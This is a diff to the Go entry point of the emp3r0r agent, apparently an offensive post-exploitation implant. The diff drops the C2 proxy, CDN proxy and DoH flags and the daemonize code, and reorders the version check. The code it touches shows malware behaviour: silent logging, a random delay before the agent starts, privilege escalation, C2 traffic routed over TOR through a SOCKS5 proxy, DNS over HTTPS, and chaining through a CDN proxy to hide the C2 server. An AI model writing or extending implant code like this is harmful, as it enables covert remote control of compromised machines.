@@ -11,7 +11,6 @@ import (
 	"log"
 	"net"
 	"os"
-	"os/exec"
 	"os/user"
 	"path/filepath"
 	"strings"
@@ -34,14 +33,18 @@ import (
 func main() {
 	var err error
 
-	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
-	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
-	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
 	replace := flag.Bool("replace", false, "Replace existing agent process")
+	replace_agent := *replace == true
 	verbose := flag.Bool("verbose", false, "Enable logging")
-	runasdaemon := flag.Bool("daemon", false, "Daemonize")
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
+
+	// version
+	if *version {
+		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
+
+		return
+	}
 
 	// silent switch
 	log.SetOutput(ioutil.Discard)
@@ -96,13 +99,6 @@ func main() {
 		log.Fatalf("ApplyRuntimeConfig: %v", err)
 	}
 
-	// version
-	if *version {
-		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)
-
-		return
-	}
-
 	// don't be hasty
 	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 
@@ -149,25 +145,6 @@ func main() {
 		log.Printf("Cleaning up *.downloading: %v", err)
 	}
 
-	// daemonize
-	if *runasdaemon {
-		args := os.Args[1:]
-		i := 0
-		for ; i < len(args); i++ {
-			if args[i] == "-daemon=true" || args[i] == "-daemon" {
-				args[i] = "-daemon=false"
-				break
-			}
-		}
-		cmd := exec.Command(os.Args[0], args...)
-		err := cmd.Start()
-		if err != nil {
-			log.Fatal(err)
-		}
-		log.Printf("%s is starting in background wit PID %d...", os.Args[0], cmd.Process.Pid)
-		os.Exit(0)
-	}
-
 	// if the agent's process name is not "emp3r0r"
 test_agent:
 	alive, pid := agent.IsAgentRunningPID()
@@ -181,7 +158,7 @@ test_agent:
 		if isAgentAlive() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
-			} else if !*replace {
+			} else if !replace_agent {
 				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
 					os.Getppid(),
 					os.Getpid())
@@ -211,8 +188,7 @@ test_agent:
 		// by default we use 443, so configure your torrc accordingly
 		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
 		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
-		agent.RuntimeConfig.C2TransportProxy = *c2proxy
-		if *c2proxy == "" {
+		if agent.RuntimeConfig.C2TransportProxy == "" {
 			agent.RuntimeConfig.C2TransportProxy = "socks5://127.0.0.1:9050"
 		}
 		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.C2TransportProxy)
@@ -223,15 +199,7 @@ test_agent:
 	}
 	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)
 
-	// if user specified a proxy, use it
-	if *c2proxy != "" {
-		agent.RuntimeConfig.C2TransportProxy = *c2proxy
-	}
-
 	// DNS
-	if *doh != "" {
-		agent.RuntimeConfig.DoHServer = *doh
-	}
 	if agent.RuntimeConfig.DoHServer != "" {
 		// use DoH resolver
 		net.DefaultResolver, err = dns.NewDoHResolver(
@@ -243,10 +211,7 @@ test_agent:
 	}
 
 	// if user wants to use CDN proxy
-	if *cdnProxy != "" {
-		agent.RuntimeConfig.CDNProxy = *cdnProxy
-	}
-	upper_proxy := agent.RuntimeConfig.C2TransportProxy // when using CDNproxy
+	upper_proxy := agent.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
 	if agent.RuntimeConfig.CDNProxy != "" {
 		log.Printf("C2 is behind CDN, using CDNProxy %s", agent.RuntimeConfig.CDNProxy)
 		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
